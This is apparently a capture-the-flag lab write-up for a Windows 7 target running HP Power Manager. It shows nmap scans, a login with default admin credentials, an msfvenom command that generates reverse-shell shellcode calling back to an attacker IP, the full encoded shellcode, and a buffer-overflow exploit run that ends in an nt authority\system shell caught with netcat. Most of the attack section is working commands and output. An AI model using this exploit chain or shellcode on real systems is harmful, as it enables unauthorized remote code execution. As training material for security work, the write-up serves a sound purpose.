# Kevin Lab
## Reconnaissance
### All port scanning
### TCP
- `nmap -p- -T4 -sS --min-rate 1000 -oN Results_tcp.txt 192.168.102.45`
```sh
    Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-26 11:37 +0530
    Nmap scan report for 192.168.102.45
    Host is up (0.12s latency).
    Not shown: 65523 closed tcp ports (reset)
    PORT      STATE SERVICE
    80/tcp    open  http
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    3389/tcp  open  ms-wbt-server
    3573/tcp  open  tag-ups-1
    49152/tcp open  unknown
    49153/tcp open  unknown
    49154/tcp open  unknown
    49155/tcp open  unknown
    49158/tcp open  unknown
    49160/tcp open  unknown
    Nmap done: 1 IP address (1 host up) scanned in 68.15 seconds
```
- `PORTS=$(grep -E '^[0-9]+/(tcp|udp)' Results_tcp.txt | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')`
- `nmap -A -p $PORTS -oN targeted_services.txt 192.168.102.45`
```sh
    Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-26 11:42 +0530
    Nmap scan report for 192.168.102.45
    Host is up (0.13s latency).

    PORT      STATE SERVICE      VERSION
    80/tcp    open  http         GoAhead WebServer
    | http-title: HP Power Manager
    |_Requested resource was http://192.168.102.45/index.asp
    |_http-server-header: GoAhead-Webs
    135/tcp   open  msrpc        Microsoft Windows RPC
    139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
    3389/tcp  open  tcpwrapped
    |_ssl-date: 2026-07-26T06:13:39+00:00; +2s from scanner time.
    | rdp-ntlm-info:
    |   Target_Name: KEVIN
    |   NetBIOS_Domain_Name: KEVIN
    |   NetBIOS_Computer_Name: KEVIN
    |   DNS_Domain_Name: kevin
    |   DNS_Computer_Name: kevin
    |   Product_Version: 6.1.7600
    |_  System_Time: 2026-07-26T06:13:24+00:00
    | ssl-cert: Subject: commonName=kevin
    | Not valid before: 2026-07-25T06:00:13
    |_Not valid after:  2027-01-24T06:00:13
    3573/tcp  open  tag-ups-1?
    49152/tcp open  msrpc        Microsoft Windows RPC
    49153/tcp open  msrpc        Microsoft Windows RPC
    49154/tcp open  msrpc        Microsoft Windows RPC
    49155/tcp open  msrpc        Microsoft Windows RPC
    49158/tcp open  msrpc        Microsoft Windows RPC
    49160/tcp open  msrpc        Microsoft Windows RPC
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Microsoft Windows 7|2008|8.1
    OS CPE: cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1
    OS details: Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1
    Network Distance: 4 hops
    Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-time:
    |   date: 2026-07-26T06:13:24
    |_  start_date: 2026-07-26T06:01:02
    | smb2-security-mode:
    |   2.1:
    |_    Message signing enabled but not required
    |_clock-skew: mean: 1h24m01s, deviation: 3h07m49s, median: 1s
    |_nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:f4:be (VMware)
    | smb-os-discovery:
    |   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
    |   OS CPE: cpe:/o:microsoft:windows_7::-
    |   Computer name: kevin
    |   NetBIOS computer name: KEVIN\x00
    |   Workgroup: WORKGROUP\x00
    |_  System time: 2026-07-25T23:13:24-07:00
    | smb-security-mode:
    |   account_used: <blank>
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)

    TRACEROUTE (using port 139/tcp)
    HOP RTT       ADDRESS
    1   113.54 ms 192.168.45.1
    2   113.48 ms 192.168.45.254
    3   113.56 ms 192.168.251.1
    4   113.68 ms 192.168.102.45

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 83.03 seconds
```

### UDP
- `nmap -sU -A --top-ports 20 192.168.102.45`
```sh
    Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-26 11:33 +0530
    Nmap scan report for 192.168.102.45
    Host is up (0.10s latency).

    PORT      STATE         SERVICE      VERSION
    53/udp    closed        domain
    67/udp    closed        dhcps
    68/udp    closed        dhcpc
    69/udp    closed        tftp
    123/udp   open|filtered ntp
    135/udp   closed        msrpc
    137/udp   open          netbios-ns   Microsoft Windows netbios-ns (workgroup: WORKGROUP)
    | nbns-interfaces:
    |   hostname: KEVIN
    |   interfaces:
    |_    192.168.102.45
    138/udp   open|filtered netbios-dgm
    139/udp   closed        netbios-ssn
    161/udp   closed        snmp
    162/udp   closed        snmptrap
    445/udp   closed        microsoft-ds
    500/udp   open|filtered isakmp
    514/udp   closed        syslog
    520/udp   closed        route
    631/udp   closed        ipp
    1434/udp  closed        ms-sql-m
    1900/udp  closed        upnp
    4500/udp  open|filtered nat-t-ike
    49152/udp closed        unknown
    Device type: general purpose
    Running: Microsoft Windows 2008|2012|7|8.1|Vista, Novell NetWare 6.X
    OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista cpe:/o:novell:netware:6
    Too many fingerprints match this host to give specific OS details
    Network Distance: 4 hops
    Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:f4:be (VMware)

    TRACEROUTE (using port 520/udp)
    HOP RTT       ADDRESS
    1   109.53 ms 192.168.45.1
    2   109.46 ms 192.168.45.254
    3   109.55 ms 192.168.251.1
    4   109.65 ms 192.168.102.45

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 156.96 seconds
```
### Web
![Image](/3.Kevin/images/website.png)
We got in using default username and password = **'admin'**
![Image_version](/3.Kevin/images/version.png)
## Exploitation
```sh
    searchsploit HP power manager
    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
    Exploit Title                                                                                                                                                                 |  Path
    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
    Flying Dog Software Powerslave 4.3 Portalmanager - 'sql_id' Information Disclosure                                                                                             | php/webapps/23163.txt
    Hewlett-Packard (HP) Power Manager Administration - Remote Buffer Overflow (Metasploit)                                                                                        | windows/remote/16785.rb
    Hewlett-Packard (HP) Power Manager Administration Power Manager Administration - Universal Buffer Overflow                                                                     | windows/remote/10099.py
    HP Power Manager - 'formExportDataLogs' Remote Buffer Overflow (Metasploit)                                                                                                    | cgi/remote/18015.rb
    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
    Shellcodes: No Results
```

`searchsploit -m  windows/remote/10099.py`
- We copied the payload and now we need to edit it so that we can gain a reverse shell instead.
```sh
msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 -e x86/alpha_mixed -f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.45.244 LPORT=100
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 710 (iteration=0)
x86/alpha_mixed chosen with final size 710
Payload size: 710 bytes
Final size of c file: 3017 bytes
unsigned char buf[] =
"\x89\xe6\xd9\xc6\xd9\x76\xf4\x5f\x57\x59\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51"
"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32"
"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
"\x42\x75\x4a\x49\x6b\x4c\x4a\x48\x4d\x52\x77\x70\x37\x70"
"\x33\x30\x51\x70\x4d\x59\x59\x75\x35\x61\x59\x50\x61\x74"
"\x4c\x4b\x52\x70\x70\x30\x6c\x4b\x71\x42\x66\x6c\x6c\x4b"
"\x62\x72\x57\x64\x4c\x4b\x61\x62\x61\x38\x44\x4f\x4d\x67"
"\x30\x4a\x45\x76\x64\x71\x6b\x4f\x6c\x6c\x57\x4c\x53\x51"
"\x63\x4c\x65\x52\x74\x6c\x71\x30\x49\x51\x58\x4f\x76\x6d"
"\x73\x31\x78\x47\x5a\x42\x6a\x52\x66\x32\x61\x47\x4e\x6b"
"\x63\x62\x44\x50\x6c\x4b\x71\x5a\x45\x6c\x4c\x4b\x62\x6c"
"\x67\x61\x33\x48\x79\x73\x57\x38\x35\x51\x7a\x71\x62\x71"
"\x6c\x4b\x43\x69\x51\x30\x66\x61\x4b\x63\x6c\x4b\x42\x69"
"\x35\x48\x4a\x43\x46\x5a\x73\x79\x4c\x4b\x55\x64\x4c\x4b"
"\x47\x71\x68\x56\x56\x51\x79\x6f\x4c\x6c\x4a\x61\x78\x4f"
"\x74\x4d\x53\x31\x4b\x77\x56\x58\x69\x70\x34\x35\x69\x66"
"\x47\x73\x71\x6d\x4b\x48\x67\x4b\x43\x4d\x56\x44\x30\x75"
"\x6a\x44\x62\x78\x6e\x6b\x53\x68\x75\x74\x77\x71\x6e\x33"
"\x42\x46\x6e\x6b\x34\x4c\x62\x6b\x6e\x6b\x61\x48\x77\x6c"
"\x53\x31\x7a\x73\x4c\x4b\x75\x54\x4c\x4b\x56\x61\x7a\x70"
"\x4c\x49\x32\x64\x47\x54\x77\x54\x43\x6b\x61\x4b\x35\x31"
"\x31\x49\x31\x4a\x42\x71\x6b\x4f\x6d\x30\x63\x6f\x43\x6f"
"\x61\x4a\x6e\x6b\x76\x72\x5a\x4b\x4e\x6d\x43\x6d\x51\x78"
"\x37\x43\x44\x72\x53\x30\x73\x30\x62\x48\x31\x67\x51\x63"
"\x30\x32\x31\x4f\x62\x74\x55\x38\x50\x4c\x33\x47\x37\x56"
"\x53\x37\x39\x6f\x7a\x75\x68\x38\x5a\x30\x33\x31\x63\x30"
"\x33\x30\x56\x49\x38\x44\x70\x54\x30\x50\x71\x78\x77\x59"
"\x6f\x70\x30\x6b\x55\x50\x49\x6f\x39\x45\x32\x70\x36\x30"
"\x30\x50\x76\x30\x63\x70\x66\x30\x51\x50\x30\x50\x73\x58"
"\x69\x7a\x46\x6f\x49\x4f\x6d\x30\x69\x6f\x38\x55\x4e\x77"
"\x70\x6a\x43\x35\x43\x58\x39\x50\x4d\x78\x46\x4d\x4b\x44"
"\x55\x38\x75\x52\x65\x50\x65\x50\x70\x64\x4b\x39\x4b\x56"
"\x32\x4a\x54\x50\x73\x66\x30\x57\x72\x48\x7a\x39\x4f\x55"
"\x42\x54\x71\x71\x4b\x4f\x6a\x75\x4d\x55\x39\x50\x34\x34"
"\x66\x6c\x49\x6f\x72\x6e\x55\x58\x73\x45\x7a\x4c\x63\x58"
"\x6c\x30\x4e\x55\x6f\x52\x73\x66\x39\x6f\x6b\x65\x53\x58"
"\x52\x43\x42\x4d\x31\x74\x53\x30\x4e\x69\x78\x63\x62\x77"
"\x76\x37\x66\x37\x75\x61\x6c\x36\x33\x5a\x65\x42\x73\x69"
"\x61\x46\x7a\x42\x59\x6d\x75\x36\x5a\x67\x63\x74\x31\x34"
"\x55\x6c\x76\x61\x66\x61\x6e\x6d\x77\x34\x46\x44\x64\x50"
"\x39\x56\x67\x70\x67\x34\x71\x44\x50\x50\x56\x36\x50\x56"
"\x46\x36\x31\x56\x36\x36\x42\x6e\x46\x36\x33\x66\x72\x73"
"\x43\x66\x31\x78\x71\x69\x5a\x6c\x45\x6f\x6e\x66\x39\x6f"
"\x58\x55\x6d\x59\x4d\x30\x52\x6e\x52\x76\x70\x46\x59\x6f"
"\x34\x70\x75\x38\x44\x48\x6d\x57\x35\x4d\x33\x50\x4b\x4f"
"\x69\x45\x6d\x6b\x48\x4d\x73\x54\x4d\x4f\x65\x38\x65\x38"
"\x79\x36\x4e\x75\x4f\x4d\x4f\x6d\x49\x6f\x49\x45\x77\x4c"
"\x75\x56\x73\x4c\x64\x4a\x6b\x30\x69\x6b\x4b\x50\x30\x75"
"\x75\x55\x6d\x6b\x61\x57\x72\x33\x53\x42\x72\x4f\x32\x4a"
"\x55\x50\x36\x33\x6b\x4f\x39\x45\x41\x41";
```

now we will copy this and edit out the payload in the exploit.
[Exlpoit](/3.Kevin/sources/exploit.py)

then setting up the nc on the port you chose.
```sh
exploit.py 192.168.217.45
HP Power Manager Administration Universal Buffer Overflow Exploit
ryujin __A-T__ offensive-security.com
[+] Sending evil buffer...
b'HTTP/1.0 200 OK\r\n'
[+] Done!
[*] Check your shell at 192.168.217.45:4444 , can take up to 1 min to spawn your shell
```
```text
nc -lvnp 100
listening on [any] 100 ...
connect to [192.168.45.244] from (UNKNOWN) [192.168.217.45] 49168
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

# SOLVED!